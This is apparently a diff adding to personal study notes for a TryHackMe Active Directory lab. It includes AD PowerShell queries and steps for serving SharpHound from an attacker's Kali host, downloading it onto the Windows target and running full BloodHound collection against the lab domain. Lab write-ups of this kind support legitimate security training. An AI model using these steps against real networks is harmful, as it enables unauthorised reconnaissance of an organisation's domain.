@@ -67,6 +67,34 @@ et-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassw
 
   CN=annette.manning,OU=Marketing,OU=People,DC=za,DC=tryhackme,DC=com
 
-
 Get-ADGroup -Identity "Tier 2 Admins"
 get-aduser -Identity beth.nolan -Properties * |Select-object 'Title'
+
+### using bloodhound
+
+Bloodhound is the software that runs locally on an attacker's machine. The attacker must run a "collector" on a target where it will enumerate lots of information about the domain. After the collector finishes running, it will output a series of .json files for import into the attacker's Bloodhound interface.
+
+`wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip`
+
+sudo python3 -m http.server 80
+
+on windows pc
+
+```
+cd ~/Documents
+
+# Download the .zip file from Kali
+Invoke-WebRequest http://kali-vpn-ip/SharpHound-v1.1.0.zip -OutFile SharpHound-v1.1
+.0.zip
+
+# Unzip the archive with PowerShell
+Expand-Archive SharpHound-v1.1.0.zip
+cd SharpHound-v1.1.0
+```
+
+.\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
+
+
+
+
+
